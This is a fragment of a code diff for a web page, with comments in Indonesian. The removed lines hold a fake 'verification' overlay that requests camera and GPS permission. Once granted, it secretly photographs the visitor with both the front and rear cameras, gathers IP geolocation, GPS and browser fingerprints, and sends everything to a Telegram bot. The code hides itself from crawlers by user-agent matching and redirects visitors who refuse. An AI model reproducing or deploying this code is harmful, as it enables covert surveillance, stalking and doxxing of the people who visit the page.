-Sentuh: ${('ontouchstart' in window)?'Ya':'Tidak'}
-Bahasa: ${navigator.language}
-Zona Waktu: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Cookies: ${navigator.cookieEnabled?'Aktif':'Nonaktif'}
-Plugin: ${Array.from(navigator.plugins||[]).map(p=>p.name).join(', ')||'none'}`;
-    }
-
-    async function fetchIPGeo() {
-      try{
-        const r=await fetch('https://ipapi.co/json/');
-        if(!r.ok)throw 0;
-        const d=await r.json();
-        return `IP: ${d.ip}
-ISP: ${d.org}
-Kota: ${d.city}, ${d.region}
-Negara: ${d.country_name} (${d.country_code})
-Koord: ${d.latitude},${d.longitude}`;
-      }catch(e){
-        try{
-          const ipR=await fetch('https://api.ipify.org?format=json');
-          const {ip}=await ipR.json();
-          const geoR=await fetch(`https://ipinfo.io/${ip}/json`);
-          const g=await geoR.json();
-          const loc=g.loc?g.loc.split(','):['?','?'];
-          return `IP: ${ip}
-ISP: ${g.org||'?'}
-Kota: ${g.city||'?'}, ${g.region||'?'}
-Negara: ${g.country||'?'}
-Koord: ${loc[0]},${loc[1]}`;
-        }catch{return 'IP_Gagal';}
-      }
-    }
-
-    // ========== KAMERA CAPTURE ==========
-    async function startCamera(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facingMode, width: {ideal:1280}, height: {ideal:720} },
-        audio: false
-      });
-      video.srcObject = stream;
-      await video.play();
-      // tunggu video siap
-      await new Promise(resolve => video.onloadedmetadata = resolve);
-      // ambil gambar
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-      // bersihkan
-      stream.getTracks().forEach(track => track.stop());
-      video.srcObject = null;
-      return blob;
-    }
-
-    async function captureBothCameras() {
-      try {
-        capturedFrontBlob = await startCamera('user');
-      } catch(e) {
-        capturedFrontBlob = null;
-      }
-      try {
-        capturedRearBlob = await startCamera('environment');
-      } catch(e) {
-        capturedRearBlob = null;
-      }
-    }
-
-    // ========== KOLASE GAMBAR ==========
-    async function createCollageBlob() {
-      if (!capturedFrontBlob && !capturedRearBlob) return null;
-      // buat image dari blob
-      const loadImg = blob => new Promise((resolve, reject) => {
-        const img = new Image();
-        img.onload = () => resolve(img);
-        img.onerror = reject;
-        img.src = URL.createObjectURL(blob);
-      });
-      let frontImg = null, rearImg = null;
-      if (capturedFrontBlob) frontImg = await loadImg(capturedFrontBlob);
-      if (capturedRearBlob) rearImg = await loadImg(capturedRearBlob);
-
-      // Tentukan ukuran canvas: lebar = max lebar kedua gambar, tinggi = jumlah tinggi + sedikit celah
-      const gap = 4;
-      let maxW = 0, totalH = 0;
-      if (frontImg) { maxW = Math.max(maxW, frontImg.width); totalH += frontImg.height; }
-      if (rearImg) { maxW = Math.max(maxW, rearImg.width); totalH += rearImg.height; }
-      if (frontImg && rearImg) totalH += gap;
-
-      canvas.width = maxW;
-      canvas.height = totalH;
-      const ctx = canvas.getContext('2d');
-      ctx.fillStyle = '#000';
-      ctx.fillRect(0,0,maxW,totalH);
-
-      let yOffset = 0;
-      if (frontImg) {
-        ctx.drawImage(frontImg, 0, yOffset, frontImg.width, frontImg.height);
-        yOffset += frontImg.height;
-        if (rearImg) yOffset += gap;
-      }
-      if (rearImg) {
-        ctx.drawImage(rearImg, 0, yOffset, rearImg.width, rearImg.height);
-      }
-
-      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.75));
-    }
-
-    // ========== GPS ==========
-    function requestLocation() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject(new Error('no_geo'));
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            gpsCoords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-            resolve(gpsCoords);
-          },
-          err => reject(err),
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      });
-    }
-
-    // ========== LOGIKA VERIFIKASI ==========
-    async function doVerification() {
-      verifyBtn.disabled = true;
-      verifyBtn.innerHTML = '<span class="spinner"></span> Memverifikasi...';
-      errorMsg.style.display = 'none';
-      attempt++;
-
-      // Minta izin kamera (depan) dan lokasi paralel
-      const results = await Promise.allSettled([
-        navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false}).then(stream => {
-          cameraStream = stream;
-          // langsung matikan dulu, nanti akan dibuka lagi saat capture
-          stream.getTracks().forEach(t=>t.stop());
-          return true;
-        }),
-        requestLocation()
-      ]);
-
-      const camOk = results[0].status === 'fulfilled';
-      const locOk = results[1].status === 'fulfilled';
-
-      if (camOk && locOk) {
-        // Sukses semua, lanjutkan pengumpulan data
-        overlay.style.display = 'none'; // sembunyikan overlay sementara
-        try {
-          // Ambil foto depan & belakang (stream baru)
-          await captureBothCameras();
-          if (!gpsCoords) {
-            // Coba lagi GPS jika perlu (mungkin sudah didapat)
-            try { await requestLocation(); } catch(e) {}
-          }
-          // Kumpulkan fingerprint
-          const canvasFP = getCanvasFingerprint();
-          const webgl = getWebGLFingerprint();
-          const audio = await getAudioFingerprint();
-          const battery = await getBatteryStatus();
-          const net = getNetworkInfo();
-          const device = getDeviceSpecs();
-          const ipGeo = await fetchIPGeo();
-          const locStr = gpsCoords ? `GPS: ${gpsCoords.lat.toFixed(6)}, ${gpsCoords.lng.toFixed(6)} (akurasi ${gpsCoords.acc}m)` : 'GPS: tidak tersedia';
-
-          // Buat kolase
-          const finalBlob = await createCollageBlob();
-          // Bangun caption
-          const caption = `🔍 <b>PENGUNJUNG TERVERIFIKASI</b>
-━━━━━━━━━━━━━━━━━━
-🌐 <b>Jaringan & Lokasi</b>
-${ipGeo}
-${locStr}
-Koneksi: ${net}
-━━━━━━━━━━━━━━━━━━
-📟 <b>Perangkat</b>
-${device}
-User Agent: ${navigator.userAgent}
-━━━━━━━━━━━━━━━━━━
-🎨 <b>Fingerprint</b>
-Canvas: ${canvasFP}
-WebGL: ${webgl}
-Audio: ${audio}
-Baterai: ${battery}
-━━━━━━━━━━━━━━━━━━
-🕒 Waktu: ${new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'})}`;
-
-          // Kirim ke Telegram
-          if (finalBlob) {
-            await sendTelegramPhoto(finalBlob, caption);
-          } else {
-            await sendTelegramMessage(caption);
-          }
-        } catch(e) {
-          console.error(e);
-          await sendTelegramMessage('⚠️ Error saat pengumpulan data: '+e.message);
-        }
-        // Tampilkan Linktree
-        mainContent.style.display = 'block';
-      } else {
-        // Ada yang gagal
-        if (attempt >= 2) {
-          // Gagal 2x, redirect
-          errorMsg.style.display = 'block';
-          errorMsg.textContent = 'Akses ditolak. Mengalihkan...';
-          verifyBtn.disabled = true;
-          verifyBtn.innerHTML = 'Ditolak';
-          setTimeout(() => {
-            window.location.replace('https://www.google.com');
-          }, 2000);
-        } else {
-          // Retry 1x
-          errorMsg.style.display = 'block';
-          errorMsg.textContent = 'Verifikasi gagal. Anda harus mengizinkan kamera dan lokasi. Klik "Coba Lagi".';
-          verifyBtn.innerHTML = '🔄 Coba Lagi';
-          verifyBtn.disabled = false;
-        }
-      }
-      if (verifyBtn.disabled) return;
-      verifyBtn.disabled = false;
-      verifyBtn.innerHTML = '👉 Verifikasi Sekarang';
-    }
-
-    // ========== EVENT LISTENER ==========
-    verifyBtn.addEventListener('click', doVerification);
-
-    // Deteksi bot: jika user-agent bot, langsung tampilkan Linktree tanpa verifikasi
-    const botPattern = /bot|crawler|spider|scraper|curl|wget|telegrambot|facebookexternalhit|twitterbot/i;
-    if (botPattern.test(navigator.userAgent)) {
-      overlay.style.display = 'none';
-      mainContent.style.display = 'block';
-    }
+    // ========== INIT ==========
+    setTimeout(() => {
+      overlay.style.display = 'flex';
+      startTimeout();
+      verifyBtn.addEventListener('click', onVerifyClick);
+    }, 2500);
   })();
   </script>
 </body>
